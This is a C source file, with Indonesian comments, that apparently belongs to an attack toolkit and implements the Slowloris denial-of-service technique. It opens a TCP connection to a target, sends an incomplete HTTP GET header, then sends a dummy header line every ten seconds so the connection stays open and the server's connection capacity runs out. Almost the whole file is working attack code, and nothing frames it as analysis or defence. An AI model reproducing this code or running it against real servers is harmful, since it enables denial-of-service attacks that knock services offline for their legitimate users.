/*
 * slowloris.c - Socket persistence lambat untuk Connection Exhaustion
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "../../include/attack/slowloris.h"

// Melakukan pengiriman HTTP header parsial secara lambat untuk menahan koneksi tetap terbuka
int slowloris_hold_connection(const char *target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }

    // Kirim inisiasi HTTP header parsial
    char *initial_headers = "GET / HTTP/1.1\r\n"
                            "Host: target-server\r\n"
                            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                            "Content-Length: 42\r\n";
    
    if (send(sock, initial_headers, strlen(initial_headers), 0) < 0) {
        close(sock);
        return -1;
    }

    // Kirim header parsial secara berkala agar koneksi tidak terputus timeout server
    for (int i = 0; i < 10; i++) {
        char keep_alive_part[32];
        snprintf(keep_alive_part, sizeof(keep_alive_part), "X-a: %d\r\n", i);
        if (send(sock, keep_alive_part, strlen(keep_alive_part), 0) < 0) {
            break;
        }
        sleep(10); // Jeda lambat per pengiriman header
    }

    close(sock);
    return 0;
}
